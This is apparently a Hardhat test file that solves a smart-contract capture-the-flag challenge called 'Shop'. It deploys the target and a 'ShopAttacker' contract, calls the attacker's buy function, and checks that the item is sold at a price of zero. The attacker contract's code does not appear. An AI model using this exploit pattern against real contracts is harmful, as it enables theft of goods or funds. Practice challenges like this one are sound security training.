import { expect } from "chai";
import { ethers } from "hardhat";

describe("Shop", () => {
  it("Solves the challenge", async () => {
    const [deployer, attacker] = await ethers.getSigners()
    const contractFactory = await ethers.getContractFactory("Shop")
    const contract = await contractFactory.connect(deployer).deploy()
    await contract.deployed()

    const attackerContractFactory = await ethers.getContractFactory("ShopAttacker")
    const attackerContract = await attackerContractFactory.connect(attacker).deploy(contract.address)
    await attackerContract.deployed()

    const tx = await attackerContract.connect(attacker).buy()
    await tx.wait()

    expect(await contract.price()).to.eq(0)
    expect(await contract.isSold()).to.be.true
  });
});